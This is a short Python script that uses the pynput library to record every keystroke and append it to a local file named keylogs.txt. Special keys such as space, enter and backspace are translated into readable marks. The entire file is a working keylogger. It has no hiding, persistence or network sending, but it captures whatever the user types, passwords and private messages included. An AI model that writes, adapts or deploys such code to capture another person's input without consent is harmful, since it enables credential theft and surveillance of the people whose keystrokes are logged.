from pynput import keyboard

# File to save logs
LOG_FILE = "keylogs.txt"

# Function to write to the log file
def write_to_file(key):
    with open(LOG_FILE, "a") as file:
        key = str(key).replace("'", "")  # Remove single quotes
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif key == "Key.backspace":
            file.write("[BACKSPACE]")
        elif key.startswith("Key."):
            file.write(f"[{key[4:].upper()}]")
        else:
            file.write(key)

# Key press listener
def on_press(key):
    write_to_file(key)

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
